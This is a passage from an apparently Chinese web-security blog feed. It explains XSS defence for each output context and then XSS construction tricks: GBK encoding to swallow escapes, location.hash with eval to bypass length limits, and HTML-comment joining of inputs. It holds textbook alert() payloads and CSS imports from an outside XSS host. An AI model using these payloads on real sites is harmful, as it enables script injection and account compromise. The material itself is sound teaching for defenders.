onclick=&quot;alert(&#x27;&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2&#x27;);&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>这里，虽然特殊字符被HTML编码，看似安全，但问题在于浏览器的解析顺序。</p><p><strong>浏览器解析流程</strong>:</p><ul><li>**HTML解析器（HTMLParser）**优先运行，它会解码HTML实体，从而恢复JavaScript代码中的特殊字符。</li><li>**JavaScript解析器（JavaScript Parser）**随后执行，此时JavaScript代码已经被“修复”成可以执行的形式。</li></ul><p>因此，最终执行的JavaScript为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">Copy code</span><br><span class="line">alert(&#x27;&#x27;);alert(&#x27;2&#x27;);</span><br></pre></td></tr></table></figure><p>这实现了攻击者的目的：在页面中注入了额外的JavaScript代码。</p></li></ol><h1 id="各种场景下的XSS防御"><a href="#各种场景下的XSS防御" class="headerlink" title="各种场景下的XSS防御"></a>各种场景下的XSS防御</h1><p>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p><p>下面用变量“$var”表示用户数据，它将被填充入HTML代码中。</p><p>可能存在以下场景：</p><h2 id="在HTML标签中输出"><a href="#在HTML标签中输出" class="headerlink" title="在HTML标签中输出"></a>在HTML标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>对变量使用HtmlEncode。</p></li></ul><h2 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合属性引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>HtmlEncode。</p></li></ul><h2 id="在script标签中输出"><a href="#在script标签中输出" class="headerlink" title="在script标签中输出"></a>在script标签中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>使用 <code>&quot;</code> 闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>JavascriptEncode</p></li></ul><h2 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h2><ul><li><p><strong>例子与利用方式</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 通过@import指令从恶意URL导入一个CSS文件</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@import&#x27;http://ha.ckers.org/xss.css&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># 从指定的URL加载绑定文件，该文件可以包含恶意的XBL</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;-moz-binding:<span class="built_in">url</span>(<span class="string">&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"># behavior属性用于将特定的行为（通常是HTC文件，一种微软专有的HTML组件）附加到页面元素。</span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"># 利用CSS中的list-style-image属性，插入JavaScript代码，该代码在渲染列表项图像时执行。</span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS</span><br><span class="line"># 通过background-image属性插入JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"># expression是一个允许CSS属性值为JavaScript表达式的特性。这可以用来执行JavaScript代码。</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><p>尽可能地禁止用户控制的变量在<code>&lt;style&gt;</code>标签、HTML标签的style属性以及CSS文件中输出。</p><p>可以使用encodeForCSS()函数</p></li></ul><h2 id="在地址中输出"><a href="#在地址中输出" class="headerlink" title="在地址中输出"></a>在地址中输出</h2><ul><li><p><strong>例子</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=$var&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>利用方式</strong></p><p>一个url的组成一般如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Protocal][Host][Path][Search][Hash]</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/a/b/c/test?abc=123#sss</span><br><span class="line">[Protocal]=&quot;https://&quot;</span><br><span class="line">[Host]=&quot;www.a.com&quot;</span><br><span class="line">[Path]=&quot;/a/b/c/test&quot;</span><br><span class="line">[Search]=&quot;?abc=123&quot;</span><br><span class="line">[Hash]=&quot;#ssss&quot;</span><br></pre></td></tr></table></figure><p>攻击者可能会构造伪协议实施攻击，包括javascript、vbscript、dataURI等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>闭合引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>防御方法</strong></p><ul><li><p><strong>检查URL的协议</strong>：确保URL以“http”或“https”开头，如果不是，则自动添加。</p></li><li><p><strong>URLEncode路径和参数</strong>：在确保协议和主机部分正确后，再对路径和参数部分进行URLEncode。</p><blockquote><p>在用户能够完全控制URL的情况下，Protocal和Host部分不能使用URLEncode，否则会改变URL的语义。</p></blockquote></li></ul></li></ul><h1 id="富文本处理"><a href="#富文本处理" class="headerlink" title="富文本处理"></a>富文本处理</h1><p>什么是富文本：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。</span><br><span class="line">比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，</span><br><span class="line">这些“富文本”的效果都需要通过HTML代码来实现。</span><br></pre></td></tr></table></figure><p>如何处理富文本：</p><ul><li>通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</li><li>禁止事件</li><li>标签的选择：使用白名单，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较“安全”的标签存在。</li><li>自定义CSS：尽量禁止</li></ul><h1 id="DOM-Based-XSS-防御"><a href="#DOM-Based-XSS-防御" class="headerlink" title="DOM Based XSS 防御"></a>DOM Based XSS 防御</h1><p>前文提到的方法都是针对 “<strong>从服务器应用直接输出到HTML页面</strong>” 的XSS漏洞，并不适用于DOM Based XSS。</p><blockquote><p>DOM Based XSS漏洞发生在客户端，<strong>浏览器</strong>在解析和执行JavaScript代码时引入了恶意脚本。</p></blockquote><ul><li><p><strong>例子1</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//将 div 元素 (id=&quot;t&quot;) 的内部 HTML 设置为一个带有 str 作为链接地址的 &lt;a&gt; 元素。链接的文本显示为 testLink。</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在button的onclick事件中，执行了test()函数，而该函数将text标签的输入值写入了DOM节点，最后导致了XSS的发生。</p></li><li><p><strong>例子2</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code1 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>变量 <code>$var</code> 被写入html页面中，可能产生xss攻击。</p><p>假设用户输入 <code>$var</code> 的值为<code>onclick=alert(1);//</code>，这个值被发送给了服务器端，服务器对其进行了 <code>javascriptEscape</code> 转义处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//code2</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> x=<span class="string">&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">write</span>&#123;<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;&gt;test&lt;/a&gt;&quot;</span>&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转义后的值被嵌入到HTML模板中，并传递到客户端浏览器。</p><p>但是，这个转义是在服务器端完成的，目的是防止直接在服务器端生成的HTML中执行恶意代码。然而，转义后的字符串被传递到客户端后，浏览器会重新解析这些转义字符，使其恢复原始的恶意代码。</p><p>当浏览器解析并执行这段JavaScript代码的时候，浏览器重新渲染页面，转义后的结果在 <code>document.write</code> 执行时，浏览器会将转义字符还原为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&#x27; onclick=alert(1);//&#x27;&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>点击 <code>test</code> 链接会触发 <code>onclick</code> 事件，成功注入XSS。</p><blockquote><p><strong>为什么会出现这样的转义无效现象？？</strong></p><p>首先，客户端对x的转义在javascript中生效了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x=&quot;\x20\x27onclick\x3dalert\x281\x29\x3b\x2f\x2f\x27&quot;;(1)</span><br></pre></td></tr></table></figure><p>当这段代码执行的时候，<strong>JavaScript解释器将这些转义字符解析为对应的实际字符</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x = &quot; &#x27;onclick=alert(1);//&#x27; &quot;;(2)</span><br></pre></td></tr></table></figure><p>注意，这里因为转义的存在，这段javascript代码中将x的内容<code>&#39;onclick=alert(1);//&#39; </code>视作了字符串，并不会对其进行执行</p><p>但是后续document.write执行的时候，会将 <code>x</code> 的内容（已经完成解析，即为上面（2）中的内容）插入到HTML中，而这段<strong>在html上插入时没有进行再转义</strong>，产生了xss漏洞。</p></blockquote></li><li><p><strong>防御方法</strong></p><p><strong>JS输出到HTML页面，也相当于一次XSS输出过程。需要分语境使用不同的编码函数。</strong></p><ul><li><p>首先，当”$var”输出到<code>&lt;script&gt;</code>时，应该执行一次javascriptEncode</p><blockquote><p>这一步是在将用户输入赋值给 JavaScript 变量时进行的编码，确保输入不会被解释为 JavaScript 代码。</p><p>在服务器端和客户端都可以进行编码</p></blockquote></li><li><p>其次，document.write输出到HTML，要分2种情况</p><ul><li>如果document.write输出到事件或者脚本，再做一次javascriptEncode</li><li>如果document.write输出到HTML内容或者属性，则做一次HtmlEncode</li></ul></li></ul></li><li><p><strong>DOM based XSS的触发点</strong></p><ul><li><p>JS输出到HTML页面</p><p>需要重点关注这几个地方的参数是否可以被用户控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br><span class="line">document.writeln()</span><br><span class="line">xxx.innerHTML=</span><br><span class="line">xxx.outerHTML=</span><br><span class="line">innerHTML.replace</span><br><span class="line">document.attachEvent()</span><br><span class="line">window.attachEvent()</span><br><span class="line">document.location.replace()</span><br><span class="line">document.location.assign()</span><br></pre></td></tr></table></figure></li><li><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">页面中所有的inputs框</span><br><span class="line">window.location(href、hash等)</span><br><span class="line">window.name</span><br><span class="line">document.referrer</span><br><span class="line">document.cookie</span><br><span class="line">localstorage</span><br><span class="line">XMLHttpRequest返回的数据</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 客户端脚本安全 </tag>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS构造技巧</title>
      <link href="/posts/6df.html"/>
      <url>/posts/6df.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍如何进行构造XSS</p><h1 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h1><ol><li><p><strong>应用场景</strong></p><p>网站对用户的输入中的双引号等特殊符号进行了转义</p></li><li><p><strong>方法</strong></p><p>构造字符编码吃掉转义符号</p></li><li><p><strong>例子</strong></p><p>网站在一个 <code>&lt;script&gt;</code> 标签里面输出了一个用户输入的变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot; &quot;</span>;</span><br></pre></td></tr></table></figure><p>如果我们输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(/XSS/);</span><br></pre></td></tr></table></figure><p>因为双引号被转义，所以在html页面上的输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot;\&quot;;alert(/XSS/);&quot;</span>;</span><br></pre></td></tr></table></figure><p>并不能执行后面的XSS代码</p><blockquote><p>javascript中的转义字符是 <code>\</code>，会将特殊符号如单引号、双引号等构造成 <code>\&#39;</code>, <code>\&quot;</code> 的形式。</p><p>在这里的话 <code>\&quot;</code> 就直接被视作文本的 <code>&quot;</code> 了，而并不会和前面的前引号 <code>&quot;</code> 形成闭合。</p></blockquote><p>但是，百度的返回页面是 <code>GBK/GB2312</code> 编码的，因此 <code>%c1\</code>  这两个字符组合在一起后，会成为一个Unicode字符。在firefox浏览器中会认为这是一个字符，所以构造xss攻击代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1<span class="string">&quot;;alert(/XSS/);//</span></span><br></pre></td></tr></table></figure><p>在页面上，引号 <code>%c1&quot;</code> 被转义成 <code>%c1\&quot;</code> ，而 <code>%c1\</code> 组成了一个新的Unicode字符，吃掉了转义符号 <code>\</code>，从而让构造的 <code>&quot;</code> 和前面的前引号形成闭合绕过了系统的安全检查，成功实施了XSS注入。</p></li></ol><h1 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h1><ol><li><p><strong>应用场景</strong></p><p>有时候服务器端可能对输入变量的长度进行了限制，长度限制不足以构造XSS</p></li><li><p><strong>方法</strong></p><p>1）<strong>使用event</strong></p><ul><li>onclick</li></ul><p>2）<strong>将payload写到别处，通过简短的代码加载这段XSS payload</strong></p><ul><li><p>loaction.hash</p><p><code>location.hash</code> 是 JavaScript 中 <code>location</code> 对象的一个属性，它返回 URL 中的哈希&#x2F;锚部分（即 <code>#</code> 号及其后面的部分）。</p><blockquote><p><code>location.hash</code> 对象的具体解释：<a link = https://blog.csdn.net/Garrettzxd/article/details/80671034> location.hash详解</a></p></blockquote><p>因为哈希部分不会被发送到服务器，所以服务器端的Web日志中并不会记录下location.hash 里的内容，从而也更好地隐藏了黑客真实的意图。</p><p><code>location.hash</code> 没有长度限制，所以可以将XSS代码写在<code>location.hash</code> 部分，然后在页面中限制长度的地方构造代码执行<code>location.hash</code> </p></li><li><p>远程加载js文件</p></li><li><p><strong>利用注释符</strong></p></li></ul></li><li><p><strong>例子</strong></p><p><strong>1）onclick</strong></p><p>构造文本框内输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)//</span> &quot;/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.1）loaction.hash</strong></p><p>构造url为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.html#alert(1)</span><br></pre></td></tr></table></figure><p>这里的 <code>#alert(1)</code> 就是<code>location.hash</code></p><p>构造网页中的文本输入框为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;eval(location.hash.substr(1)) &quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval（）函数：</p><ul><li>如果参数是一个表达式，eval() 函数将执行表达式。</li><li>如果参数是 Javascript 语句，eval() 将执行 Javascript 语句。</li></ul></blockquote><p>当我们点击这个文本框的时候，会执行 <code>location.hash</code> 中的代码，并去掉哈希部分的第一个字符（<code>#</code>）</p><p>因此，当用户点击这个输入框时， <code>location.hash</code>为 <code>#alert(1)</code>，去掉第一个字符后，<code>eval</code> 函数将执行 <code>alert(1)</code>，从而弹出一个警告框。</p><p>这样就成功执行了我们构造的XSS攻击代码。</p><p><strong>2.3）利用注释符</strong></p><p>网站上存在两个文本框，第一个文本框存在长度限制，第二个文本框允许写入更多的字节。</p><p>此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个<code>&lt;input&gt;</code> 标签。</p><p>例，有2个文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">xxxxxxxxxxxxx</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">2</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在第一个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=&quot;</span><span class="keyword">var</span> a=<span class="string">&#x27;This is a long &#x27;</span>;<span class="string">&quot;&gt;&lt;!--</span></span><br></pre></td></tr></table></figure><blockquote><p><code>onfocus</code> 事件是一个 JavaScript 事件，它在元素获得焦点时触发。焦点是指用户通过点击、触摸或使用键盘（如 Tab 键）将输入光标或选中状态移动到某个元素上。</p><p>在 HTML 中，<code>onfocus</code> 事件可以直接在元素标签内部指定</p></blockquote><p>在第二个input文本框中，输入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(a + <span class="string">&#x27;XSS attack!&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>最终生成的html代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;input1&quot;</span> type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;var a=&#x27;This is a long &#x27;;&quot;</span>&gt;&lt;!--<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;!-- Some HTML content or other inputs --&gt;</span></span><br><span class="line"><span class="string">&lt;input id=&quot;</span>input2<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; value=&quot;</span>--&gt;<span class="language-xml"><span 